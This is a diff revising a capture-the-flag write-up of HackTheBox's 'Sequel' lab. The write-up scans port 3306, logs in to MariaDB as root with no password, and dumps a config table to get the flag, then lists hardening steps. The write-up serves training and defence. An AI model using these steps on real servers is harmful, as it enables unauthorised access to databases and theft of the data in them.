@@ -1,73 +1,53 @@
 # Sequel - HackTheBox Writeup 🗄️
 
-## 🚩 Room Information
-- **Platform:** [HackTheBox](https://app.hackthebox.com/)
-- **Track:** Starting Point - Tier 0
-- **Difficulty:** Very Easy
-- **Category:** Database Security / MariaDB & MySQL
-- **Status:** ✅ Completed
+- **Platform:** HackTheBox (Starting Point - Tier 0)
+- **Target OS:** Linux
+- **Vulnerability:** Unauthenticated Remote MySQL/MariaDB Access
 
 ---
 
-## 🎓 Learning Objectives
-- Enumerating database management services exposed over the network.
-- Interacting with **MariaDB / MySQL** database servers using the `mysql` CLI client.
-- Discovering blank/default root credentials on exposed database instances.
-- Performing basic SQL queries (`SHOW DATABASES`, `SHOW TABLES`, `SELECT`).
+## 📌 Reconnaissance
 
----
+I scanned the target for database services:
 
-## 🧠 Knowledge Required
-- Basic SQL syntax.
-- Command-line usage of `mysql` tool (`mysql -h <IP> -u <USER>`).
-
----
-
-## 🔍 Step-by-Step Walkthrough
-
-### 1. Port Enumeration
-Scan the target IP address for MySQL database services:
 ```bash
 nmap -sV -p 3306 <TARGET_IP>
 ```
-* **Discovered Open Port:** `3306/tcp` running `MariaDB 10.3.27`.
 
-### 2. Service Exploitation
-Attempt remote authentication as the `root` user without specifying a password:
+### Scan Results:
+- `3306/tcp open mysql MariaDB 10.3.27`
+
+Port 3306 (MySQL/MariaDB) was open to external connections.
+
+---
+
+## ⚡ Exploitation
+
+I attempted to connect directly to the MariaDB server as `root` without providing a password:
+
 ```bash
 mysql -h <TARGET_IP> -u root
 ```
-Access is granted directly to the MariaDB monitor shell!
 
-### 3. Database Enumeration & Querying
-List available databases:
+The connection succeeded immediately without asking for credentials.
+
+---
+
+## 🚩 Flag Capture
+
+Inside the MariaDB shell:
+
 ```sql
 MariaDB [(none)]> SHOW DATABASES;
-```
-* **Discovered Databases:** `information_schema`, `htb`, `mysql`, `performance_schema`.
-
-Select the `htb` database:
-```sql
 MariaDB [(none)]> USE htb;
-```
-
-List tables inside `htb`:
-```sql
 MariaDB [htb]> SHOW TABLES;
-```
-* **Discovered Table:** `config`.
-
-Dump table contents to find the flag:
-```sql
 MariaDB [htb]> SELECT * FROM config;
 ```
 
----
-
-## 🛡️ Remediation & Key Takeaways
-- **Bind Address Restriction:** Bind MySQL/MariaDB services to `127.0.0.1` unless remote connections are strictly necessary.
-- **Set Strong Passwords:** Never leave administrative database accounts (`root`) without a strong password.
-- **Firewall Controls:** Restrict access to database ports (3306) using host-based and network firewalls.
+The `config` table contained the flag string.
 
 ---
-*Based on HackTheBox content. Compiled by [Amit Padhan](https://github.com/amitpadhan525)*
+
+## 💡 Notes & Takeaways
+- Always set strong passwords on administrative database users (`root`).
+- Bind database services to `127.0.0.1` unless remote access is explicitly required and secured by a firewall.
